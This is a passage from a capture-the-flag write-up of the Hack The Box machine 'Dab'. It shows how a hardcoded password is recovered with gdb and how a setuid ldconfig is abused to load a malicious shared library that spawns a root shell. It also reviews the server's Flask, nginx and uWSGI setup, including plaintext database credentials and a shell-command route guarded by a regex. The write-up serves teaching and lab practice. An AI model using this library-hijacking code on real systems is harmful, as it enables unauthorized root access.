RIP: 0x400895 (<main+95>:       call   0x400710 <strcmp@plt>)
R8 : 0x7ffff7d99760 --> 0xfbad2a84
R9 : 0x0
R10: 0x0
R11: 0x7ffff7d493e0 --> 0x2000200020002
R12: 0x400740 (<_start>:        xor    ebp,ebp)
R13: 0x7fffffffe0a0 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40088b <main+85>:  lea    rax,[rbp-0x60]
   0x40088f <main+89>:  mov    rsi,rdx
   0x400892 <main+92>:  mov    rdi,rax
=> 0x400895 <main+95>:  call   0x400710 <strcmp@plt>
   0x40089a <main+100>: mov    DWORD PTR [rbp-0x64],eax
   0x40089d <main+103>: cmp    DWORD PTR [rbp-0x64],0x0
   0x4008a1 <main+107>: je     0x4008b4 <main+126>
   0x4008a3 <main+109>: mov    edi,0x40098a
Guessed arguments:
arg[0]: 0x7fffffffdf60 ("s3cur3l0g1n")
arg[1]: 0x7fffffffdf70 --> 0x66647830 ('0xdf')
arg[2]: 0x7fffffffdf70 --> 0x66647830 ('0xdf')
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdf50 --> 0x0
0008| 0x7fffffffdf58 --> 0x0
0016| 0x7fffffffdf60 ("s3cur3l0g1n")
0024| 0x7fffffffdf68 --> 0x6e3167 ('g1n')
0032| 0x7fffffffdf70 --> 0x66647830 ('0xdf')
0040| 0x7fffffffdf78 --> 0x0
0048| 0x7fffffffdf80 --> 0x1
0056| 0x7fffffffdf88 --> 0x40093d (<__libc_csu_init+77>:        add    rbx,0x1)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000000000400895 in main ()

```

About 2/3 of the way down, I can see that I’m at a call to `strcmp` and that the guessed arguments are my throw away password, and “s3cur3l0g1n”.

#### Run With Password

Now with password in hand, I’ll run `myexec` again:

```

genevieve@dab:/dev/shm$ myexec
Enter password: s3cur3l0g1n
Password is correct

seclogin() called
TODO: Placeholder for now, function not implemented yet

```

#### \_seclogin

I’ll remember from my RE above that on successful password check, the program calls `_seclogin`:

![1540836193926](https://0xdfimages.gitlab.io/img/1540836193926.png)

Based on the output above, that function is currently implemented to just print a message saying that it does nothing. If I run from my local host, I’ll see it failing to find the library:

```

root@kali# ./myexec
./myexec: error while loading shared libraries: libseclogin.so: cannot open shared object file: No such file or directory

```

If I grab a copy of the library from Dab, and look at it in Ida, I’ll see the function is just that, two `puts` calls:

![1548786736026](https://0xdfimages.gitlab.io/img/1548786736026.png)

I can use `ldd` to view the shared library dependencies as the os sees them:

```

genevieve@dab:/dev/shm$ ldd /usr/bin/myexec 
        linux-vdso.so.1 =>  (0x00007ffc2e101000)
        libseclogin.so => /usr/lib/libseclogin.so (0x00007f604e46a000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f604e0a0000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f604e66c000)

```

### Library Attack

#### Background

One way to tell a binary to use a different library than the one it expects is to use the `LD_PRELOAD` variable, and, at run time, tell the os to link functions from the path in that variable first. However, one of the really smart protections that Linux put in place is that when `LD_PRELOAD` is used, any setuid privileges are dropped.

This is where the fact that `ldconfig` is setuid allowing me to run it as root comes in handy. I can use this to configure where the binary looks for libraries, and give it one of my own instead of the one it currently looks for.

#### Hello World POC

I’ll make a quick hello world program that implements the `seclogin` function:

```

genevieve@dab:/dev/shm$ cat .a.c
#include <stdio.h>

void seclogin() {
    printf("hello, world!");
}

```

Next I’ll compile it to a library using the `-shared` and `-fPIC` flags:

```

genevieve@dab:/dev/shm$ gcc -shared -fPIC /dev/shm/.a.c -o /dev/shm/libseclogin.so

```

The `-shared` flag tells gcc to make a shared object which can later be linked to other objects, and `-fPIC` says to emit position independent code, which is what a library typically needs. I’ve output my library in `/dev/shm` (just a place to stage, could be anywhere).

Next, I’ll create a config file for `ldconfig` that simply includes the path I want to check:

```

genevieve@dab:/dev/shm$ cat df.conf 
/dev/shm

```

Now I’ll change the configuration with `ldconfig`. First, I’ll show the libraries before I change anything:

```

genevieve@dab:/dev/shm$ ldd /usr/bin/myexec 
        linux-vdso.so.1 =>  (0x00007fff061d0000)
        libseclogin.so => /usr/lib/libseclogin.so (0x00007fd56002e000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fd55fc64000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fd560230000)

```

Now, I’ll use `ldconfig` to add my path. `myexec` now is looking for libraries (including `libseclogin.so`) in `/dev/shm`:

```

genevieve@dab:/dev/shm$ ldconfig -f df.conf 
genevieve@dab:/dev/shm$ ldd /usr/bin/myexec 
        linux-vdso.so.1 =>  (0x00007ffcef9c8000)
        libseclogin.so => /dev/shm/libseclogin.so (0x00007fa94237b000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa941fb1000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fa94257d000)

```

And when I run it, my hello world executes:

```

genevieve@dab:/dev/shm$ myexec 
Enter password: s3cur3l0g1n
Password is correct

hello, world!

```

I can also change it back by running `ldconfig` with no arguments:

```

genevieve@dab:/dev/shm$ ldconfig
genevieve@dab:/dev/shm$ ldd /usr/bin/myexec 
        linux-vdso.so.1 =>  (0x00007ffdeabf9000)
        libseclogin.so => /usr/lib/libseclogin.so (0x00007fa8bcd00000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa8bc936000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fa8bcf02000)

```

#### Shell

Now, I can update this code to give me a shell:

```

genevieve@dab:/dev/shm$ cat .a.c 
void seclogin() {
    setuid(0);
    setgid(0);
    execl("/bin/sh","sh",0);
}

```

I’ll compile (warnings are ok):

```

genevieve@dab:/dev/shm$ gcc -shared -fPIC /dev/shm/.a.c -o /dev/shm/libseclogin.so
/dev/shm/.a.c: In function ‘seclogin’:
/dev/shm/.a.c:2:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
     setuid(0);
     ^
/dev/shm/.a.c:3:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
     setgid(0);
     ^
/dev/shm/.a.c:4:5: warning: implicit declaration of function ‘execl’ [-Wimplicit-function-declaration]
     execl("/bin/sh","sh",0);
     ^
/dev/shm/.a.c:4:5: warning: incompatible implicit declaration of built-in function ‘execl’
/dev/shm/.a.c:4:5: warning: missing sentinel in function call [-Wformat=]

```

I’ll make sure to `ldconfig -f df.conf` if I cleared it earlier or if [somehow it got reset](#cleanup). Then I can run `myexec` and get a root shell:

```

genevieve@dab:/dev/shm$ myexec 
Enter password: s3cur3l0g1n
Password is correct

# id
uid=0(root) gid=0(root) groups=0(root),1000(genevieve)
# /bin/bash
root@dab:/dev/shm#

```

I can grab root.txt:

```

root@dab:/root# cat root.txt 
45cd53a8...

```

## Beyond Root

### Web Config / Memcache

It’s always interesting to look at how the web application is set up, and this is an interesting case. Both sites are running as Python Flask applications. The server is using `nginx` with a wsgi pass to `python`.

#### nginx

The `nginx` configs are in `/etc/nginx/sites-enabled`:

```

root@dab:/etc/nginx/sites-enabled# ls
dev  prod

root@dab:/etc/nginx/sites-enabled# cat prod 
server {
    listen 80;
    server_name dab.htb;
    
    location / {
        include uwsgi_params;
        uwsgi_pass unix:/var/www/prod/prod.sock;
    }
}

root@dab:/etc/nginx/sites-enabled# cat dev 
server {
    listen 8080;
    server_name dab.htb;
    
    location / {
        include uwsgi_params;
        uwsgi_pass unix:/var/www/dev/dev.sock;
    }
}

```

I can see that prod is listening on port 80, and dev on port 8080. In each case, the connection is passed to a unix socket in `/var/www/`.

#### uWSGI

`uWSGI` provides the glue between `nginx` and the `python` app. In `/var/www/prod`, I’ll find a `prod.ini` that defines how `uwsgi` will run (there’s a similar file for `dev`):

```

root@dab:/var/www/prod# cat prod.ini 
[uwsgi]
module = wsgi:app

master = true
processes = 5

socket = prod.sock
chmod-socket = 600
vacuum = true

die-on-term = true

```

This will run `wsgi.py`, as well as start 5 processes to handle connections. I see those in the process list (I cut out a lot of the processes I didn’t care about at the moment):

```

root@dab:/var/www/prod# pstree -aps
systemd,1
  ├─memcached,1090 -m 64 -p 11211 -u memcache -l 127.0.0.1
  │   ├─{memcached},1139
  │   ├─{memcached},1140
  │   ├─{memcached},1141
  │   ├─{memcached},1142
  │   └─{memcached},1143
  ├─nginx,1240
  │   └─nginx,1242
  ├─uwsgi,1084 --ini dev.ini
  │   ├─uwsgi,1285 --ini dev.ini
  │   ├─uwsgi,1286 --ini dev.ini
  │   ├─uwsgi,1287 --ini dev.ini
  │   ├─uwsgi,1288 --ini dev.ini
  │   └─uwsgi,1289 --ini dev.ini
  └─uwsgi,1103 --ini prod.ini
      ├─uwsgi,1279 --ini prod.ini
      ├─uwsgi,1280 --ini prod.ini
      ├─uwsgi,1281 --ini prod.ini
      ├─uwsgi,1282 --ini prod.ini
      └─uwsgi,1283 --ini prod.ini

```

`wsgi.py` simply imports the actual app, and runs it:

```

from prod import app

if __name__ == "__main__":
    app.run()

```

#### Prod - Port 80

The code for the prod server has helpers for both memcached and sql:

```

from flaskext.mysql import MySQL
from pymemcache.client.base import Client                                                                                                                                                     

# App variables                                                                                                                                                                               
app = Flask(__name__)
app.config["MYSQL_DATABASE_USER"] = "dab_user"
app.config["MYSQL_DATABASE_PASSWORD"] = "kUi87_23$bxQsmk,a2"
app.config["MYSQL_DATABASE_DB"] = "dab"
app.config["MYSQL_DATABASE_HOST"] = "localhost"
app.config["SECRET_KEY"] = "todo_change_this"
app.config["SESSION_TYPE"] = "memcached"

# MySQL
mysql = MySQL()
mysql.init_app(app)

# Memcached
client = Client(("localhost", 11211))

```

Then, each time it needs to check something, it first checks memcached, and if that fails, checks sql. For example, here’s the login route (remember `client` is the memcached connection):

```

@app.route("/login", methods=["GET", "POST"])
def login():
    if "username" in session:
        return redirect(url_for("index"))

    error = None

    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        result = client.get("users")
        if result:
            users = json.loads(client.get("users"))
            # print "Loaded users from memcache"
        else:
            conn = mysql.connect().cursor()
            conn.execute("SELECT * FROM users")
            query_result_list = conn.fetchall()
            users = {}
            for query_result in query_result_list:
                users[query_result[0].lower()] = query_result[2]
            client.set("users", json.dumps(users), expire=30)
            # print "Loaded users from MySQL"
        if request.form["username"].lower() in users:
            if users[username.lower()] == hashlib.md5(request.form["password"]).hexdigest():
                session["username"] = request.form["username"]
                return redirect(url_for('index'))
                # print "Good credentials"
            else:
                error = "Login failed"
                return render_template("login.html", error=error)
                # print "Invalid password"
        else:
            error = "Login failed."
            return render_template("login.html", error=error)
            # print "Invalid username"
    return render_template("login.html", error=error)

```

The page doesn’t actually do anything other than load the items data. After getting it via memcached or sql, it returns:

```

return render_template("index.html", error=None, user=session["username"], products=products, source=source)

```

#### Dev - Port 8080

`dev.py` has two routes, `/` and `/socket`:

```

  1 import re
  2 from subprocess import check_output
  3 from flask import Flask, render_template, request
  4 app = Flask(__name__)
  5 
  6 AUTH_ENABLED = True
  7 
  8 def validate_cmd(cmd):
  9         match = re.match("^[a-zA-Z0-9 ]*$", cmd)
 10         return match is not None
 11 
 12 @app.route("/")
 13 def index():
 14         error = None
 15 
 16         if not 'password' in request.cookies and AUTH_ENABLED:
 17                 error = "Access denied: password authentication cookie not set"
 18                 return render_template("index.html", error=error)
 19         if request.cookies.get('password') != 'secret' and AUTH_ENABLED:
 20                 error = "Access denied: password authentication cookie incorrect"
 21                 return render_template("index.html", error=error)
 22 
 23         return render_template("index.html")
 24 
 25 @app.route("/socket", methods=["GET"])
 26 def socket_data():
 27         port = request.args.get("port", default="", type=int)
 28         cmd = request.args.get("cmd", default="", type=str)
 29         if not cmd or not port:
 30                 error = "Missing parameters"
 31                 return render_template("index.html", error=error)
 32 
 33         if port < 1 or port > 65535:
 34                 error = "Invalid port"
 35                 return render_template("index.html", error=error)
 36 
 37         if not validate_cmd(cmd):
 38                 error = "Suspected hacking attempt detected"
 39                 return render_template("index.html", error=error)
 40 
 41         data = check_output("echo '{}' | /bin/nc 127.0.0.1 {:d}".format(cmd, port), shell=True)
 42 
 43         return render_template("index.html", socket_data=data)
 44 
 45 if __name__ == "__main__":
 46     app.run(host='0.0.0.0')

```

At the root, there’s checks that the cookie `password` is present (line 16), and then that the value is `secret` (19). Then it returns the index.html template (23).

On the `/socket` route (line 25), it takes the port and cmd (27-28), makes sure both are present (29), that the port is an int between 1 and 65535 (33), and runs a validation function on the cmd (37). Then it runs `echo {} | /bin/nc 127.0.0.1 {}` where the first `{}` is the cmd and the second is port (41). The result is returned in the same template, but this time with the `socket_data` variable defined (43).

This would be vulnerable to shell injection, except the validation function makes sure that the only valid characters are upper and lower a-z, 0-9, and space. I didn’t show it above, but I was actually trying to see if I could get the port 80 webpage over this interface by sending something like `port=80&cmd=GET+/+HTTP/1.1`. But it always failed with a “suspected hacking attempt detected” message, and looking at this now, it’s clear why.

#### Summary

This is a pretty typical stack for Flask applications. Digital Ocean has a pretty good [tutorial](https://www.digitalocean.com/community/tutorials/how-to-serve-flask-applications-with-uwsgi-and-nginx-on-ubuntu-14-04#configure-uwsgi) for how to set this kind of thing up if you’re interested in further reading.

### try\_harder

When I first got access to the box as genevieve, I found in my enumeration that I could `sudo /usr/bin/try_harder`:

```

genevieve@dab:~$ sudo -l
[sudo] password for genevieve: 
Matching Defaults entries for genevieve on dab:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User genevieve may run the following commands on dab:
    (root) /usr/bin/try_harder

```

I first tried to run it without `sudo`, and it seems to return a root prompt:

```

genevieve@dab:~$ /usr/bin/try_harder 
root@dab:~# 

```

However, no matter what I enter, it returns “Segmentation fault”, and then gives a message indicating it’s a troll:

```

genevieve@dab:~$ /usr/bin/try_harder 
root@dab:~# id
Segmentation fault
That would have been too easy! Try something else.

```

I did a bit of digging on the file just to see what was there. First, it’s a stripped 64-bit elf:

```

root@kali# file try_harder
try_harder: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=960df11f376672a4941d2f1ad26d14e9b2270b53, stripped

```

When I open it in Ida (free version), it can still find main:

![1548778462702](https://0xdfimages.gitlab.io/img/1548778462702.png)

Looking at that, I’ll see it just prints the string “root@dab:~# “, and then waits for input in the form of `fgets`. It then prints “Segmentation fault”, sleeps for 3 seconds, and prints the troll message. Then it exits.

`fgets` is only going to read 0x40 characters. And the buffer it reads into is at `rbp-0x50`, so no chance to overflow anything there.

It only took about 3 minutes to make this check, and now I’ve verified that nothing interesting is going on here.

### cleanup

There was a cleanup cron job running in the root crontab:

```
*/1 * * * * for file in $(find /tmp -type f -amin +2); do rm -f $file; ldconfig; done

```

This never really impacted me, as I staged out of `/dev/shm`, but I can see how if you were working out of `/tmp` this may have gotten annoying. Ever minute, this job would find all files in `/tmp` that were last accessed more than 2 minutes ago, and it would remove them. Then, it resets the linking configuration to default using `lgconfig` (actually once for each file it removes). I’m not sure if this was the author’s intent, but if there are no older files in `/tmp`, then this `ldconfig` reset doesn’t happen.